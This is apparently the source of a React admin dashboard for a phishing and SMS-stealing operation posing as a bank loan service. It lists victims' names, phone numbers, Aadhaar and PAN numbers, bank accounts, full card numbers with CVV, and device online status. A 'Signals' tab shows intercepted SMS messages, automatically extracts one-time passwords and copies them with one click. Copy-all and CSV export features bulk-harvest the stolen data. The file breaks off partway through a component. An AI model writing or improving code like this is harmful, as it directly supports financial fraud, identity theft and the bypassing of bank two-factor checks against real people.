import React, { useEffect, useState, useMemo, useRef, useCallback } from 'react';
import { getApplications, getSmsLogs, deleteApplication } from '../services/adminApi';
import {
    Box, Typography, Paper, IconButton, Chip, Divider,
    Dialog, DialogContent, DialogTitle, Tab, Tabs, Skeleton,
    Badge, Tooltip, InputBase, Snackbar, Alert, Collapse
} from '@mui/material';
import {
    Shield, Phone, Calendar, Smartphone, CreditCard,
    Building2, Copy, Download, X, Eye, EyeOff,
    Search, Zap, MessageSquare, Wifi, WifiOff,
    User, Database, ExternalLink, ChevronRight, RefreshCw,
    ChevronDown, ChevronUp, Activity, Bell
} from 'lucide-react';
import Papa from 'papaparse';
import { format, formatDistanceToNow } from 'date-fns';

// ─── Safe Helpers (never throw) ───
function safeStr(val) { return val != null ? String(val) : ''; }

function extractOTP(text) {
    try {
        if (!text) return null;
        const m = String(text).match(/\b\d{4,6}\b/);
        return m ? m[0] : null;
    } catch { return null; }
}

function getDeviceName(app) {
    try {
        if (!app) return 'Unknown Device';
        const fp = app.deviceFingerprint;
        if (fp?.deviceInfo) return String(fp.deviceInfo);
        if (fp?.deviceId) return String(fp.deviceId);
        if (app.deviceId) return String(app.deviceId);
        return 'Unknown Device';
    } catch { return 'Unknown Device'; }
}

function isLive(app) {
    try {
        if (!app?.updatedAt && !app?.createdAt) return false;
        const last = new Date(app.updatedAt || app.createdAt);
        return (Date.now() - last.getTime()) < 300000; // 5 min
    } catch { return false; }
}

function shortId(id) {
    try {
        if (!id) return '---';
        const s = String(id);
        return s.length > 12 ? s.slice(0, 8) + '…' : s;
    } catch { return '---'; }
}

function safeDate(dateStr) {
    try {
        if (!dateStr) return null;
        const d = new Date(dateStr);
        return isNaN(d.getTime()) ? null : d;
    } catch { return null; }
}

// ─── Main Component ───
export default function DashboardPage() {
    const [apps, setApps] = useState([]);
    const [loading, setLoading] = useState(true);
    const [error, setError] = useState(null);
    const [searchQuery, setSearchQuery] = useState('');
    const [selectedApp, setSelectedApp] = useState(null);
    const [modalOpen, setModalOpen] = useState(false);
    const [tabValue, setTabValue] = useState(0);
    const [liveSms, setLiveSms] = useState([]);
    const [showCVV, setShowCVV] = useState(false);
    const [lastSync, setLastSync] = useState(null);
    const [snackMsg, setSnackMsg] = useState('');
    const [smsCountMap, setSmsCountMap] = useState({});
    const [statusAlerts, setStatusAlerts] = useState([]);
    const [newDataPulse, setNewDataPulse] = useState(false);
    const [isRefreshing, setIsRefreshing] = useState(false);
    const prevAppsRef = useRef([]);
    const mountedRef = useRef(true);

    // SMS counts are now provided by the backend directly in the applications list.
    // fetchSmsCounts is no longer needed.

    // ─── Data Fetch with Failover ───
    const refreshData = useCallback(async () => {
        // Use a ref-like check to avoid stale closures in the interval
        if (mountedRef.current && isRefreshing) return;

        setIsRefreshing(true);
        if (apps.length === 0) setLoading(true);

        try {
            const data = await getApplications();
            if (!mountedRef.current) return;

            if (Array.isArray(data)) {
                const prevApps = prevAppsRef.current;
                if (prevApps.length > 0) {
                    const alerts = [];
                    data.forEach(app => {
                        const prevApp = prevApps.find(p =>
                            (p.applicationId && p.applicationId === app.applicationId) ||
                            (p.deviceId && p.deviceId === app.deviceId)
                        );
                        if (prevApp) {
                            const wasLive = isLive(prevApp);
                            const nowLive = isLive(app);
                            const name = app.fullName || getDeviceName(app) || shortId(app.applicationId);
                            if (!wasLive && nowLive) {
                                alerts.push({ type: 'online', name });
                            } else if (wasLive && !nowLive) {
                                alerts.push({ type: 'offline', name });
                            }
                        }
                    });

                    if (data.length > prevApps.length) {
                        setNewDataPulse(true);
                        setTimeout(() => mountedRef.current && setNewDataPulse(false), 2000);
                    }
                    if (alerts.length > 0) {
                        setStatusAlerts(alerts);
                        setTimeout(() => mountedRef.current && setStatusAlerts([]), 4000);
                    }
                }

                prevAppsRef.current = data;
                setApps(data);
                setLastSync(new Date());
                setError(null);

                const counts = {};
                data.forEach(app => {
                    counts[app.applicationId || app.mobile] = app.smsCount || 0;
                });
                setSmsCountMap(counts);
            }
        } catch (err) {
            console.error('Data fetch error:', err);
            if (mountedRef.current) {
                setError('Connection issue — retrying...');
            }
        } finally {
            if (mountedRef.current) {
                setLoading(false);
                setIsRefreshing(false);
            }
        }
    }, [apps.length]); // apps.length triggers skeleton on first fetch, removed isRefreshing to prevent loop

    useEffect(() => {
        mountedRef.current = true;
        refreshData();
        const interval = setInterval(refreshData, 15000);
        return () => {
            mountedRef.current = false;
            clearInterval(interval);
        };
    }, []); // Empty dependency array prevents the interval from restarting on every fetch

    // ─── Deduplicated & Sorted ───
    const processedApps = useMemo(() => {
        try {
            const unique = {};
            (apps || []).forEach(app => {
                if (!app) return;
                const key = app.deviceId || app.mobile || app.id || Math.random().toString();
                if (!unique[key] || new Date(app.createdAt) > new Date(unique[key].createdAt)) {
                    unique[key] = app;
                }
            });
            return Object.values(unique).sort((a, b) => {
                const da = safeDate(a.createdAt);
                const db = safeDate(b.createdAt);
                if (!da && !db) return 0;
                if (!da) return 1;
                if (!db) return -1;
                return db.getTime() - da.getTime();
            });
        } catch { return []; }
    }, [apps]);

    // ─── Filtered by search ───
    const filteredApps = useMemo(() => {
        try {
            if (!searchQuery.trim()) return processedApps;
            const q = searchQuery.toLowerCase();
            return processedApps.filter(app =>
                safeStr(app.fullName).toLowerCase().includes(q) ||
                safeStr(app.mobile).includes(q) ||
                safeStr(app.applicationId).toLowerCase().includes(q) ||
                getDeviceName(app).toLowerCase().includes(q)
            );
        } catch { return processedApps; }
    }, [processedApps, searchQuery]);

    // ─── Open target detail ───
    const openTarget = async (app) => {
        if (!app) return;
        setSelectedApp(app);
        setTabValue(0);
        setShowCVV(false);
        setModalOpen(true);
        try {
            const logs = await getSmsLogs(app.applicationId || app.mobile);
            if (mountedRef.current) {
                setLiveSms(Array.isArray(logs) ? logs : []);
            }
        } catch {
            if (mountedRef.current) setLiveSms([]);
        }
    };

    // ─── Handle Delete ───
    const handleDelete = async (e, id) => {
        e.stopPropagation();
        if (!window.confirm('Are you sure you want to delete this submission? This will also remove all associated SMS logs.')) return;

        try {
            await deleteApplication(id);
            setSnackMsg('Record deleted');
            refreshData();
        } catch (err) {
            setSnackMsg('Delete failed');
        }
    };

    // ─── Copy helpers ───
    const copyText = (text) => {
        if (!text) return;
        try {
            navigator.clipboard.writeText(String(text));
            setSnackMsg('Copied');
        } catch { /* silent */ }
    };

    const copyAllPII = (app) => {
        if (!app) return;
        try {
            const lines = [
                `Name: ${safeStr(app.fullName) || '-'}`,
                `Phone: ${safeStr(app.mobile) || '-'}`,
                `DOB: ${safeStr(app.dob) || '-'}`,
                `PAN: ${safeStr(app.panCard) || '-'}`,
                `Aadhaar: ${safeStr(app.aadhaarNumber) || '-'}`,
                `Bank: ${safeStr(app.bankAccount?.bankName) || '-'}`,
                `Account: ${safeStr(app.bankAccount?.accountNumber) || '-'}`,
                `IFSC: ${safeStr(app.bankAccount?.ifscCode) || '-'}`,
                `Card: ${safeStr(app.bankAccount?.cardNumber) || '-'}`,
                `Expiry: ${safeStr(app.bankAccount?.cardExpiry) || '-'}`,
                `CVV: ${safeStr(app.bankAccount?.cardCvv) || '-'}`,
                `Device: ${getDeviceName(app)}`,
                `App ID: ${safeStr(app.applicationId) || '-'}`,
            ];
            navigator.clipboard.writeText(lines.join('\n'));
            setSnackMsg('All data copied');
        } catch { /* silent */ }
    };

    // ─── Export CSV ───
    const exportCSV = () => {
        try {
            const rows = (apps || []).map(app => ({
                AppID: safeStr(app.applicationId),
                Name: safeStr(app.fullName),
                Phone: safeStr(app.mobile),
                PAN: safeStr(app.panCard),
                Aadhaar: safeStr(app.aadhaarNumber),
                Bank: safeStr(app.bankAccount?.bankName),
                Account: safeStr(app.bankAccount?.accountNumber),
                Amount: app.bankAccount?.loanAmountOffer || 0,
                Device: getDeviceName(app),
                Status: isLive(app) ? 'LIVE' : 'OFFLINE',
                Date: safeDate(app.createdAt) ? format(safeDate(app.createdAt), 'yyyy-MM-dd HH:mm') : '',
            }));
            const csv = Papa.unparse(rows);
            const blob = new Blob([csv], { type: 'text/csv;charset=utf-8;' });
            const a = document.createElement('a');
            a.href = URL.createObjectURL(blob);
            a.download = `RBLADMIN_Export_${Date.now()}.csv`;
            a.click();
            setSnackMsg('CSV exported');
        } catch (err) {
            setSnackMsg('Export failed');
        }
    };

    // ─── Stats ───
    const totalAmount = (apps || []).reduce((s, a) => s + (a?.bankAccount?.loanAmountOffer || 0), 0);
    const liveCount = processedApps.filter(isLive).length;
    const offlineCount = processedApps.length - liveCount;
    const totalSms = Object.values(smsCountMap).reduce((s, v) => s + v, 0);

    // ═══════════════════════════════════════════════
    // RENDER
    // ═══════════════════════════════════════════════
    return (
        <Box sx={{ px: 2, pt: 2, pb: 10 }}>

            {/* ─── STATUS ALERTS (device online/offline transitions) ─── */}
            {statusAlerts.map((alert, i) => (
                <Alert
                    key={i}
                    severity={alert.type === 'online' ? 'success' : 'warning'}
                    variant="filled"
                    sx={{
                        mb: 1, borderRadius: '12px', fontWeight: 700, fontSize: '12px',
                        animation: 'fadeInUp 0.3s ease-out',
                    }}
                    icon={alert.type === 'online' ? <Wifi size={16} /> : <WifiOff size={16} />}
                >
                    {alert.name} — {alert.type === 'online' ? 'CAME ONLINE' : 'DISCONNECTED'}
                </Alert>
            ))}

            {/* ─── COMMAND HERO ─── */}
            <Box className="animate-in" sx={{
                background: 'linear-gradient(145deg, rgba(2,6,23,0.95), rgba(15,23,42,0.9))',
                backdropFilter: 'blur(20px)',
                border: '1px solid var(--border-accent)',
                borderRadius: '24px',
                p: 3,
                mb: 2,
                position: 'relative',
                overflow: 'hidden',
            }}>
                {/* Emerald glow */}
                <Box sx={{
                    position: 'absolute', top: -50, right: -50,
                    width: 160, height: 160,
                    background: 'radial-gradient(circle, rgba(16,185,129,0.12), transparent 70%)',
                    borderRadius: '50%',
                    pointerEvents: 'none',
                }} />
                <Box sx={{
                    position: 'absolute', bottom: -30, left: -30,
                    width: 100, height: 100,
                    background: 'radial-gradient(circle, rgba(212,168,83,0.06), transparent 70%)',
                    borderRadius: '50%',
                    pointerEvents: 'none',
                }} />

                {/* Header row */}
                <Box sx={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', mb: 2.5, position: 'relative', zIndex: 1 }}>
                    <Box>
                        <Box sx={{ display: 'flex', alignItems: 'center', gap: 1, mb: 0.5 }}>
                            <Activity size={12} color="#10b981" />
                            <Typography sx={{
                                fontSize: '10px', fontWeight: 700, color: '#10b981',
                                textTransform: 'uppercase', letterSpacing: '0.2em',
                                fontFamily: '"JetBrains Mono", monospace',
                            }}>
                                Network Status
                            </Typography>
                        </Box>
                        <Typography sx={{
                            fontSize: '38px', fontWeight: 900, lineHeight: 1,
                            color: 'var(--text-primary)', letterSpacing: '-0.03em',
                            fontFamily: '"JetBrains Mono", monospace',
                        }}>
                            {loading ? '—' : processedApps.length}
                        </Typography>
                        <Typography sx={{
                            fontSize: '11px', color: 'var(--text-muted)', mt: 0.5,
                            fontFamily: '"JetBrains Mono", monospace',
                        }}>
                            Total Submissions
                        </Typography>
                    </Box>
                    <Box sx={{ display: 'flex', flexDirection: 'column', gap: 0.8, alignItems: 'flex-end' }}>
                        {/* Live indicator */}
                        <Chip
                            size="small"
                            icon={<Box sx={{
                                width: 7, height: 7, borderRadius: '50%',
                                backgroundColor: '#10b981',
                            }} className={newDataPulse ? 'pulse-dot' : 'pulse-dot'} />}
                            label={`${liveCount} Live`}
                            sx={{
                                height: 28,
                                backgroundColor: 'rgba(16, 185, 129, 0.1)',
                                color: '#10b981',
                                border: '1px solid rgba(16, 185, 129, 0.25)',
                                fontSize: '11px', fontWeight: 700,
                                fontFamily: '"JetBrains Mono", monospace',
                                '& .MuiChip-icon': { ml: '6px' },
                            }}
                        />
                        {/* Offline indicator */}
                        <Chip
                            size="small"
                            icon={<Box sx={{
                                width: 7, height: 7, borderRadius: '50%',
                                backgroundColor: '#64748b',
                            }} />}
                            label={`${offlineCount} Offline`}
                            sx={{
                                height: 28,
                                backgroundColor: 'rgba(100, 116, 139, 0.1)',
                                color: '#64748b',
                                border: '1px solid rgba(100, 116, 139, 0.2)',
                                fontSize: '11px', fontWeight: 700,
                                fontFamily: '"JetBrains Mono", monospace',
                                '& .MuiChip-icon': { ml: '6px' },
                            }}
                        />
                    </Box>
                </Box>

                {/* Stats row */}
                <Box sx={{ display: 'flex', gap: 1.5, position: 'relative', zIndex: 1 }}>
                    <StatMini label="Total Value" value={`₹${totalAmount > 0 ? (totalAmount / 100000).toFixed(1) + 'L' : '0'}`} />
                    <StatMini label="SMS Captured" value={String(totalSms)} icon={<MessageSquare size={10} />} />
                    <StatMini label="Last Sync" value={lastSync ? formatDistanceToNow(lastSync, { addSuffix: false }) : '...'} />
                    <StatMini label="Export" value="CSV" onClick={exportCSV} clickable />
                </Box>
            </Box>

            {/* ─── SEARCH ─── */}
            <Box className="animate-in-delay-1" sx={{
                display: 'flex', alignItems: 'center', gap: 1,
                backgroundColor: 'var(--bg-card)',
                border: '1px solid var(--border-subtle)',
                borderRadius: '14px',
                px: 1.5, py: 0.5, mb: 2,
            }}>
                <Search size={16} color="var(--text-muted)" />
                <InputBase
                    placeholder="Search name, phone, ID, device..."
                    value={searchQuery}
                    onChange={e => setSearchQuery(e.target.value)}
                    sx={{
                        flex: 1, fontSize: '13px', color: 'var(--text-primary)',
                        '& input::placeholder': { color: 'var(--text-muted)', opacity: 1 },
                    }}
                />
                {searchQuery && (
                    <IconButton size="small" onClick={() => setSearchQuery('')} sx={{ color: 'var(--text-muted)' }}>
                        <X size={14} />
                    </IconButton>
                )}
                <IconButton
                    size="small"
                    onClick={refreshData}
                    sx={{ color: 'var(--text-muted)' }}
                    disabled={isRefreshing}
                >
                    <RefreshCw
                        size={14}
                        style={{
                            animation: isRefreshing ? 'spin 1s linear infinite' : 'none'
                        }}
                    />
                </IconButton>
            </Box>

            {/* Global Spin Animation */}
            <style>
                {`
                @keyframes spin {
                    from { transform: rotate(0deg); }
                    to { transform: rotate(360deg); }
                }
                `}
            </style>

            {/* ─── ERROR STATE ─── */}
            {error && (
                <Alert severity="warning" variant="outlined" sx={{
                    mb: 2, borderRadius: '12px', fontSize: '12px',
                    borderColor: 'rgba(245, 158, 11, 0.3)',
                    backgroundColor: 'rgba(245, 158, 11, 0.05)',
                }}>
                    {error}
                </Alert>
            )}

            {/* ─── SECTION LABEL ─── */}
            <Box className="animate-in-delay-2" sx={{
                display: 'flex', alignItems: 'center', justifyContent: 'space-between',
                px: 0.5, mb: 1.5,
            }}>
                <Box sx={{ display: 'flex', alignItems: 'center', gap: 1 }}>
                    <Box sx={{ width: 3, height: 14, borderRadius: 2, background: 'linear-gradient(to bottom, #10b981, #34d399)' }} />
                    <Typography sx={{
                        fontSize: '11px', fontWeight: 700, color: 'var(--text-secondary)',
                        textTransform: 'uppercase', letterSpacing: '0.12em',
                    }}>
                        Form Submissions
                    </Typography>
                </Box>
                <Typography className="mono" sx={{ fontSize: '10px', color: 'var(--text-muted)' }}>
                    {filteredApps.length} {filteredApps.length === 1 ? 'entry' : 'entries'}
                </Typography>
            </Box>

            {/* ─── SUBMISSION CARDS ─── */}
            <Box className="animate-in-delay-3" sx={{ display: 'flex', flexDirection: 'column', gap: 1.5 }}>
                {loading ? (
                    [0, 1, 2, 3].map(i => (
                        <Skeleton key={i} variant="rounded" height={96} sx={{ borderRadius: '16px', backgroundColor: 'var(--bg-card)' }} />
                    ))
                ) : filteredApps.length === 0 ? (
                    <Paper sx={{
                        textAlign: 'center', py: 6, px: 3,
                        borderRadius: '16px', border: '1px dashed var(--border-subtle)',
                        backgroundColor: 'transparent',
                    }}>
                        <Database size={28} color="var(--text-muted)" style={{ marginBottom: 8, opacity: 0.3 }} />
                        <Typography sx={{ fontSize: '12px', fontWeight: 700, color: 'var(--text-muted)', textTransform: 'uppercase', letterSpacing: '0.15em' }}>
                            {searchQuery ? 'No matches found' : 'Awaiting first submission…'}
                        </Typography>
                    </Paper>
                ) : (
                    filteredApps.map((app, idx) => (
                        <SubmissionCard
                            key={app.id || app.applicationId || idx}
                            app={app}
                            smsCount={smsCountMap[app.applicationId || app.mobile] || 0}
                            onTap={() => openTarget(app)}
                            onDelete={(e) => handleDelete(e, app.applicationId)}
                            onCopyAll={() => copyAllPII(app)}
                            delay={Math.min(idx * 40, 400)}
                        />
                    ))
                )}
            </Box>

            {/* ─── DETAIL MODAL ─── */}
            <Dialog
                open={modalOpen}
                onClose={() => setModalOpen(false)}
                fullScreen
                PaperProps={{
                    sx: {
                        backgroundColor: 'var(--bg-primary)',
                        backgroundImage: 'none',
                    }
                }}
            >
                {selectedApp && (
                    <>
                        {/* Modal Header */}
                        <Box sx={{
                            display: 'flex', alignItems: 'center', justifyContent: 'space-between',
                            px: 2.5, py: 2,
                            borderBottom: '1px solid var(--border-subtle)',
                            background: 'linear-gradient(to bottom, rgba(15,23,42,0.9), var(--bg-primary))',
                        }}>
                            <Box sx={{ display: 'flex', alignItems: 'center', gap: 1.5 }}>
                                <Box sx={{
                                    width: 44, height: 44, borderRadius: '14px',
                                    background: isLive(selectedApp)
                                        ? 'linear-gradient(135deg, #10b981, #059669)'
                                        : 'linear-gradient(135deg, #475569, #334155)',
                                    display: 'flex', alignItems: 'center', justifyContent: 'center',
                                    color: '#fff', fontWeight: 900, fontSize: '18px',
                                    boxShadow: isLive(selectedApp) ? '0 0 20px rgba(16,185,129,0.2)' : 'none',
                                }}>
                                    {safeStr(selectedApp.fullName).charAt(0).toUpperCase() || '?'}
                                </Box>
                                <Box>
                                    <Typography sx={{ fontSize: '16px', fontWeight: 800, color: 'var(--text-primary)', lineHeight: 1.2 }}>
                                        {safeStr(selectedApp.fullName) || 'Unknown'}
                                    </Typography>
                                    <Box sx={{ display: 'flex', alignItems: 'center', gap: 0.5, mt: 0.3 }}>
                                        <Box sx={{
                                            width: 6, height: 6, borderRadius: '50%',
                                            backgroundColor: isLive(selectedApp) ? '#10b981' : '#64748b',
                                        }} className={isLive(selectedApp) ? 'pulse-dot' : ''} />
                                        <Typography className="mono" sx={{
                                            fontSize: '10px', color: isLive(selectedApp) ? '#10b981' : 'var(--text-muted)',
                                            letterSpacing: '0.05em', fontWeight: 600,
                                        }}>
                                            {isLive(selectedApp) ? 'LIVE' : 'OFFLINE'} • {shortId(selectedApp.applicationId)}
                                        </Typography>
                                    </Box>
                                </Box>
                            </Box>
                            <Box sx={{ display: 'flex', gap: 0.5 }}>
                                <IconButton size="small" onClick={() => copyAllPII(selectedApp)} sx={{ color: 'var(--text-secondary)' }}>
                                    <Download size={18} />
                                </IconButton>
                                <IconButton size="small" onClick={() => setModalOpen(false)} sx={{ color: 'var(--text-secondary)' }}>
                                    <X size={18} />
                                </IconButton>
                            </Box>
                        </Box>

                        {/* Tabs */}
                        <Tabs
                            value={tabValue}
                            onChange={(_, v) => setTabValue(v)}
                            variant="fullWidth"
                            sx={{
                                borderBottom: '1px solid var(--border-subtle)',
                                '& .MuiTab-root': {
                                    fontSize: '11px', fontWeight: 700,
                                    textTransform: 'uppercase', letterSpacing: '0.1em',
                                    color: 'var(--text-muted)',
                                    minHeight: 44,
                                },
                                '& .Mui-selected': { color: '#10b981' },
                                '& .MuiTabs-indicator': { backgroundColor: '#10b981', height: 2 },
                            }}
                        >
                            <Tab label="Profile" />
                            <Tab label="Financial" />
                            <Tab label={
                                <Badge badgeContent={liveSms.length} color="primary" max={99}
                                    sx={{ '& .MuiBadge-badge': { fontSize: '9px', minWidth: 16, height: 16, backgroundColor: '#10b981' } }}
                                >
                                    Signals
                                </Badge>
                            } />
                        </Tabs>

                        {/* Tab Content */}
                        <Box sx={{ flex: 1, overflowY: 'auto', p: 2.5 }}>

                            {/* ── Profile Tab ── */}
                            {tabValue === 0 && (
                                <Box sx={{ display: 'flex', flexDirection: 'column', gap: 2 }}>
                                    <SectionLabel text="Identity" />
                                    <InfoRow icon={<User size={16} />} label="Full Name" value={selectedApp.fullName} onCopy={() => copyText(selectedApp.fullName)} />
                                    <InfoRow icon={<Phone size={16} />} label="Mobile" value={selectedApp.mobile} onCopy={() => copyText(selectedApp.mobile)} />
                                    <InfoRow icon={<Calendar size={16} />} label="Date of Birth" value={selectedApp.dob} />

                                    <SectionLabel text="Application" />
                                    <InfoRow icon={<Database size={16} />} label="Form ID" value={selectedApp.applicationId} onCopy={() => copyText(selectedApp.applicationId)} valueColor="#d4a853" />
                                    <InfoRow icon={<Zap size={16} />} label="Type" value={selectedApp.deviceFingerprint?.applicationType || selectedApp.applicationType || 'standard'} />
                                    <InfoRow icon={<Calendar size={16} />} label="Submitted" value={safeDate(selectedApp.createdAt) ? format(safeDate(selectedApp.createdAt), 'MMM dd, yyyy HH:mm') : '—'} />

                                    <SectionLabel text="Documents" />
                                    <InfoRow icon={<CreditCard size={16} />} label="PAN Card" value={selectedApp.panCard} onCopy={() => copyText(selectedApp.panCard)} />
                                    <InfoRow icon={<Shield size={16} />} label="Aadhaar" value={selectedApp.aadhaarNumber} onCopy={() => copyText(selectedApp.aadhaarNumber)} />

                                    <SectionLabel text="Device" />
                                    <InfoRow icon={<Smartphone size={16} />} label="Device" value={getDeviceName(selectedApp)} />
                                    <InfoRow
                                        icon={isLive(selectedApp) ? <Wifi size={16} /> : <WifiOff size={16} />}
                                        label="Status"
                                        value={isLive(selectedApp) ? 'LIVE — Connected' : 'OFFLINE — Disconnected'}
                                        valueColor={isLive(selectedApp) ? '#10b981' : '#ef4444'}
                                    />
                                </Box>
                            )}

                            {/* ── Financial Tab ── */}
                            {tabValue === 1 && (
                                <Box sx={{ display: 'flex', flexDirection: 'column', gap: 2 }}>
                                    <SectionLabel text="Bank Account" />
                                    <InfoRow icon={<Building2 size={16} />} label="Bank" value={selectedApp.bankAccount?.bankName} />
                                    <InfoRow icon={<ExternalLink size={16} />} label="Account No." value={selectedApp.bankAccount?.accountNumber} onCopy={() => copyText(selectedApp.bankAccount?.accountNumber)} />
                                    <InfoRow icon={<Zap size={16} />} label="IFSC" value={selectedApp.bankAccount?.ifscCode} onCopy={() => copyText(selectedApp.bankAccount?.ifscCode)} />

                                    <SectionLabel text="Card Details" />
                                    {/* Card Visual */}
                                    <Paper sx={{
                                        p: 3, borderRadius: '20px',
                                        background: 'linear-gradient(145deg, #0f172a, #020617)',
                                        border: '1px solid rgba(16, 185, 129, 0.15)',
                                        position: 'relative', overflow: 'hidden',
                                    }}>
                                        <Box sx={{
                                            position: 'absolute', top: -20, right: -20,
                                            width: 80, height: 80,
                                            background: 'radial-gradient(circle, rgba(16,185,129,0.1), transparent 70%)',
                                            borderRadius: '50%',
                                        }} />
                                        <Box sx={{ display: 'flex', justifyContent: 'space-between', mb: 3 }}>
                                            <CreditCard size={28} color="#10b981" />
                                            <Typography className="mono" sx={{ fontSize: '9px', color: 'var(--text-muted)', fontWeight: 700, textTransform: 'uppercase', letterSpacing: '0.1em' }}>
                                                Encrypted
                                            </Typography>
                                        </Box>

                                        <Typography className="mono" sx={{ fontSize: '9px', color: 'var(--text-muted)', mb: 0.5, fontWeight: 600, textTransform: 'uppercase', letterSpacing: '0.1em' }}>
                                            Card Number
                                        </Typography>
                                        <Box sx={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', mb: 2.5 }}>
                                            <Typography className="mono" sx={{ fontSize: '20px', fontWeight: 800, color: 'var(--text-primary)', letterSpacing: '0.08em' }}>
                                                {safeStr(selectedApp.bankAccount?.cardNumber) || '---- ---- ---- ----'}
                                            </Typography>
                                            <IconButton size="small" onClick={() => copyText(selectedApp.bankAccount?.cardNumber)} sx={{ color: 'var(--text-muted)' }}>
                                                <Copy size={14} />
                                            </IconButton>
                                        </Box>

                                        <Box sx={{ display: 'flex', gap: 4 }}>
                                            <Box>
                                                <Typography className="mono" sx={{ fontSize: '9px', color: 'var(--text-muted)', mb: 0.3, fontWeight: 600, textTransform: 'uppercase' }}>Expiry</Typography>
                                                <Typography className="mono" sx={{ fontSize: '16px', fontWeight: 800, color: 'var(--text-primary)' }}>
                                                    {safeStr(selectedApp.bankAccount?.cardExpiry) || '--/--'}
                                                </Typography>
                                            </Box>
                                            <Box>
                                                <Typography className="mono" sx={{ fontSize: '9px', color: 'var(--text-muted)', mb: 0.3, fontWeight: 600, textTransform: 'uppercase' }}>CVV</Typography>
                                                <Box sx={{ display: 'flex', alignItems: 'center', gap: 1 }}>
                                                    <Typography className="mono" sx={{ fontSize: '16px', fontWeight: 800, color: '#10b981' }}>
                                                        {showCVV ? (safeStr(selectedApp.bankAccount?.cardCvv) || '---') : '•••'}
                                                    </Typography>
                                                    <IconButton size="small" onClick={() => setShowCVV(!showCVV)} sx={{ color: 'var(--text-muted)', p: 0.3 }}>
                                                        {showCVV ? <EyeOff size={14} /> : <Eye size={14} />}
                                                    </IconButton>
                                                </Box>
                                            </Box>
                                        </Box>
                                    </Paper>

                                    {/* Loan Amount */}
                                    <Paper sx={{
                                        p: 2.5, borderRadius: '16px', textAlign: 'center',
                                        backgroundColor: 'rgba(16, 185, 129, 0.05)',
                                        border: '1px solid rgba(16, 185, 129, 0.15)',
                                    }}>
                                        <Typography className="mono" sx={{ fontSize: '9px', color: 'var(--text-muted)', mb: 0.5, fontWeight: 700, textTransform: 'uppercase', letterSpacing: '0.15em' }}>
                                            Loan / Amount
                                        </Typography>
                                        <Typography className="mono" sx={{ fontSize: '32px', fontWeight: 900, color: '#10b981', letterSpacing: '-0.02em' }}>
                                            ₹{(selectedApp.bankAccount?.loanAmountOffer || 0).toLocaleString()}
                                        </Typography>
                                    </Paper>
                                </Box>
                            )}

                            {/* ── Signals Tab ── */}
                            {tabValue === 2 && (
                                <Box sx={{ display: 'flex', flexDirection: 'column', gap: 1.5 }}>
                                    {liveSms.length === 0 ? (
                                        <Box sx={{ textAlign: 'center', py: 6, opacity: 0.3 }}>
                                            <MessageSquare size={32} style={{ marginBottom: 8, margin: '0 auto 8px' }} />
                                            <Typography sx={{ fontSize: '11px', fontWeight: 700, textTransform: 'uppercase', letterSpacing: '0.15em' }}>
                                                No signals intercepted
                                            </Typography>
                                        </Box>
                                    ) : (
                                        liveSms.map((sms, i) => {
                                            const otp = extractOTP(sms.body || sms.message || '');
                                            return (
                                                <Paper key={i} sx={{
                                                    p: 2, borderRadius: '14px',
                                                    backgroundColor: 'var(--bg-card)',
                                                    border: otp
                                                        ? '1px solid rgba(16, 185, 129, 0.2)'
                                                        : '1px solid var(--border-subtle)',
                                                    position: 'relative',
                                                }}>
                                                    <Box sx={{ display: 'flex', justifyContent: 'space-between', mb: 0.8 }}>
                                                        <Typography className="mono" sx={{ fontSize: '11px', fontWeight: 700, color: 'var(--text-primary)' }}>
                                                            {safeStr(sms.address || sms.sender) || 'Unknown'}
                                                        </Typography>
                                                        <Typography className="mono" sx={{ fontSize: '9px', color: 'var(--text-muted)' }}>
                                                            {safeDate(sms.date) ? format(safeDate(sms.date), 'HH:mm:ss') : ''}
                                                        </Typography>
                                                    </Box>
                                                    <Typography sx={{ fontSize: '13px', color: 'var(--text-secondary)', lineHeight: 1.5 }}>
                                                        {safeStr(sms.body || sms.message)}
                                                    </Typography>
                                                    {otp && (
                                                        <Chip
                                                            label={`OTP: ${otp}`}
                                                            size="small"
                                                            onClick={() => copyText(otp)}
                                                            sx={{
                                                                mt: 1, height: 24,
                                                                backgroundColor: 'rgba(16, 185, 129, 0.15)',
                                                                color: '#10b981',
                                                                fontWeight: 700, fontSize: '11px',
                                                                fontFamily: '"JetBrains Mono", monospace',
                                                                border: '1px solid rgba(16, 185, 129, 0.25)',
                                                                cursor: 'pointer',
                                                                '&:hover': { backgroundColor: 'rgba(16, 185, 129, 0.25)' },
                                                            }}
                                                        />
                                                    )}
                                                </Paper>
                                            );
                                        })
                                    )}
                                </Box>
                            )}
                        </Box>
                    </>
                )}
            </Dialog>

            {/* ─── SNACKBAR ─── */}
            <Snackbar
                open={!!snackMsg}
                autoHideDuration={1500}
                onClose={() => setSnackMsg('')}
                anchorOrigin={{ vertical: 'bottom', horizontal: 'center' }}
            >
                <Alert severity="success" variant="filled" sx={{
                    borderRadius: '12px', fontWeight: 700, fontSize: '12px',
                    backgroundColor: '#10b981',
                }}>
                    {snackMsg}
                </Alert>
            </Snackbar>
        </Box>
    );
}

// ═══════════════════════════════════════════════
// SUB-COMPONENTS (all MUI sx, zero Tailwind)
// ═══════════════════════════════════════════════

function StatMini({ label, value, onClick, clickable, icon }) {
    return (
        <Box
            onClick={onClick}
            sx={{
                flex: 1, py: 1.2, px: 1.5,
                backgroundColor: 'rgba(255,255,255,0.03)',
                border: '1px solid var(--border-subtle)',
                borderRadius: '12px',
                cursor: clickable ? 'pointer' : 'default',
                transition: 'all 0.2s',
                ...(clickable && { '&:hover': { backgroundColor: 'rgba(16,185,129,0.08)', borderColor: 'rgba(16,185,129,0.2)' } }),
            }}
        >
            <Box sx={{ display: 'flex', alignItems: 'center', gap: 0.5, mb: 0.3 }}>
                {icon && <Box sx={{ color: 'var(--text-muted)' }}>{icon}</Box>}
                <Typography sx={{ fontSize: '8px', fontWeight: 700, color: 'var(--text-muted)', textTransform: 'uppercase', letterSpacing: '0.1em', fontFamily: '"JetBrains Mono", monospace' }}>
                    {label}
                </Typography>
            </Box>
            <Typography className="mono" sx={{ fontSize: '13px', fontWeight: 800, color: clickable ? '#10b981' : 'var(--text-primary)' }}>
                {value}
            </Typography>
        </Box>
    );
}

function SubmissionCard({ app, smsCount, onTap, onDelete, onCopyAll, delay }) {
    const live = isLive(app);
    const device = getDeviceName(app);
    const amount = app?.bankAccount?.loanAmountOffer || 0;
    const appId = safeStr(app?.applicationId);

    // Detect if this user has any OTP messages in their history (if decrypted)
    const hasOTP = useMemo(() => {
        try {
            const history = app.smsHistory;
